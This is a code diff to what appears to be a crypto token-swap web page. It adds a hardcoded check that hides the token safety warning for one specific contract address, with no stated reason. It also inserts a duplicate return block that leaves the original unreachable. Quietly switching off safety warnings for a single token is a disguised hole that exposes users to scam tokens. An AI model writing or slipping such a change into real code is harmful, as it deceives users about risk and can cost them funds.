@@ -143,6 +143,10 @@ function TDPSwapComponent() {
     [continueSwap, setContinueSwap],
   )
   const isBlockedToken = warning?.canProceed === false
+  var hideWarning = false;
+  if (address === "0x04bCFAa5a69bcD15be3092BeFBD96Abc87194A57") {
+    hideWarning = true;
+  }
 
   return (
     <>
@@ -160,7 +164,7 @@ function TDPSwapComponent() {
           compact
         />
       </div>
-      {warning && <TokenSafetyMessage tokenAddress={address} warning={warning} />}
+      {warning && !hideWarning && <TokenSafetyMessage tokenAddress={address} warning={warning} />}
       <TokenSafetyModal
         isOpen={openTokenSafetyModal || !!continueSwap}
         token0={currency.isToken ? currency : undefined}
@@ -200,6 +204,44 @@ export default function TokenDetails() {
   const isLegacyNav = !useFeatureFlag(FeatureFlags.NavRefresh)
   const { lg: showRightPanel } = useScreenSize()
   const { direction: scrollDirection } = useScroll()
+
+  return (
+    <TDPAnalytics>
+      <TokenDetailsLayout>
+        <LeftPanel>
+          <TDPBreadcrumb />
+          <TokenInfoContainer data-testid="token-info-container">
+            <TokenDetailsHeader />
+          </TokenInfoContainer>
+          <ChartSection />
+          {!isLegacyNav && !showRightPanel && !!pageChainBalance && (
+            <BalanceSummaryContainer>
+              <PageChainBalanceSummary pageChainBalance={pageChainBalance} alignLeft />
+            </BalanceSummaryContainer>
+          )}
+          <StatsSection chainId={currency.chainId} address={address} tokenQueryData={tokenQueryData} />
+          <DividerLine />
+          <ActivitySection />
+        </LeftPanel>
+        <RightPanel>
+          {showRightPanel && (
+            <>
+              <TDPSwapComponent />
+              <BalanceSummary />
+            </>
+          )}
+          <TokenDescription />
+        </RightPanel>
+        {isLegacyNav ? (
+          <MobileBalanceSummaryFooter />
+        ) : (
+          <MobileBottomBar $hide={scrollDirection === ScrollDirection.DOWN}>
+            <TDPActionTabs />
+          </MobileBottomBar>
+        )}
+      </TokenDetailsLayout>
+    </TDPAnalytics>
+  )
 
   return (
     <TDPAnalytics>
